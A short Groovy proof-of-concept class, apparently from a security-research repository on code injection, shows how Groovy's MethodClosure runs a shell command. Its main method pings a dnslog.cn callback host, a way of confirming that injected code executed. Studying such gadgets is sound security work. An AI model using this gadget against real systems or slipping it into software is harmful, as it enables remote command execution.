package com.t4rrega.injection.Code.Groovy

import org.codehaus.groovy.runtime.MethodClosure

class MethodClosureDemo {
    static void main(String[] args) {
        MethodClosure methodClosure = new MethodClosure("ping xsw60n.dnslog.cn","execute");
        methodClosure.call();
    }
}
